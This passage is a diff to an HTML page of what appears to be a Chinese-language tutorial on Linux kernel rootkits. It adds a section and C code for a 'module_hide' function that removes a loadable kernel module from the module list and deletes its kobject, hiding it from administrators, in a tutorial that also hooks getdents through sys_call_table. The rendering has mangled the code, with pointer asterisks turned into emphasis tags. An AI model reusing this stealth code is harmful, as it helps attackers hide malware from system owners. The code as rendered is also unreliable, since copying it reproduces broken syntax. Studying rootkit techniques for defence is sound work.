@@ -253,6 +253,29 @@ getdents<span class="o">(</span><span class="m">3</span>,<span class="w"> </span
 <p>在Linux系统中，如果我们想在内核中运行代码，我们可以借助于可装载内核模块（LKM）。一些有用的内核符号就会被内核导出，我们便能够去使用它们，或者也可以通过kallsyms_lookup_name函数来获取。在内核中，我们需要拦截getdents调用，并对它返回的值进行更改。那么，接下来要解决的问题就是我们要如何Hook getdents。</p>
 <p>在内核之中，存在一个系统调用表。其中的系统调用编号（系统调用发生时rax的值）是其Handler在其表中的偏移量。
 系统调用表位于sys_call_table，它是系统内核的一块区间，其作用是将调用号和服务函数连接起来，当系统调用某一个syscall，就会通过sys_call_table查找到该服务函数。</p>
+<p>隐藏模块。具体功能如下：</p>
+<ul>
+<li>记录当前模块的链表前驱节点。</li>
+<li>从模块链表中删除当前模块。</li>
+<li>记录当前模块的kobject链表前驱节点。</li>
+<li>删除模块的kobject。</li>
+<li>从kobject链表中删除当前模块。</li>
+</ul>
+<p>```bash</p>
+<p>static struct list_head <em>module_previous;
+static struct list_head </em>module_kobj_previous;
+static char module_hidden = 0;</p>
+<p>void module_hide(void)
+{
+    if (module_hidden) return;
+    module_previous = THIS_MODULE-&gt;list.prev;
+    list_del(&amp;THIS_MODULE-&gt;list);
+    module_kobj_previous = THIS_MODULE-&gt;mkobj.kobj.entry.prev;
+    kobject_del(&amp;THIS_MODULE-&gt;mkobj.kobj);
+    list_del(&amp;THIS_MODULE-&gt;mkobj.kobj.entry);
+    module_hidden = !module_hidden;
+}</p>
+<p>```</p>
   </div>
 </article>
 <div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
